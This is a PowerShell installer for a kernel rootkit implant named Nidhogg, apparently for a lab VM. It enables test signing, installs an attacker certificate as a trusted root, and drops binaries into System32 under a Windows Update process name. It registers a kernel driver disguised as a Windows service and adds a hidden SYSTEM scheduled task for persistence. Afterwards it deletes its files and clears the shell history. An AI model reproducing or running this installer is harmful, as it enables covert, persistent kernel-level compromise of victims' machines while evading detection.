# Install-Implant.ps1 - For the actual VM (with test signing)

$TargetDir = "C:\Windows\System32"
$CertPath = "$env:TEMP\Nidhogg.cer"

Write-Host "[+] Starting Implant Installation..." -ForegroundColor Cyan

# === Enable Test Signing (if not already enabled) ===
$current = bcdedit /enum {current} | Select-String "testsigning"
if ($current -match "No") {
    Write-Host "[+] Enabling Test Signing..." -ForegroundColor Yellow
    bcdedit /set testsigning on
    bcdedit /set debug on
    Write-Host "   → Test Signing enabled. REBOOT REQUIRED." -ForegroundColor Yellow
} else {
    Write-Host "[+] Test Signing is already enabled." -ForegroundColor Green
}

# === Copy Files ===
Copy-Item ".\NidhoggClient.exe"        "$TargetDir\wuauclt.exe" -Force
Copy-Item ".\Implant.ps1"              "$TargetDir\Implant.ps1" -Force

# === Certificate ===
if (Test-Path ".\Nidhogg.cer") {
    Copy-Item ".\Nidhogg.cer" $CertPath -Force
    certutil -addstore Root $CertPath | Out-Null
    certutil -addstore TrustedPublisher $CertPath | Out-Null
    Remove-Item $CertPath -Force -ErrorAction SilentlyContinue
}

# === Register Driver ===
sc.exe create "WindowsUpdateSvc" type= kernel start= auto binPath= C:\Windows\System32\drivers\Nidhogg.sys | Out-Null
sc.exe start "WindowsUpdateSvc" | Out-Null

# === Persistence Task ===
$action = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File $TargetDir\Implant.ps1"

$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName "Windows Update Health Monitor" -Action $action -Trigger $trigger -Principal $principal -Force

# === Cleanup ===
Remove-Item "*.exe","*.ps1","*.cer" -Force -ErrorAction SilentlyContinue
Clear-History

Write-Host "`n=== Installation Finished ===" -ForegroundColor Green
if ($current -match "No") {
    Write-Host "Please REBOOT now for changes to take effect." -ForegroundColor Yellow
} else {
    Write-Host "Reboot recommended to fully test the implant." -ForegroundColor Yellow
}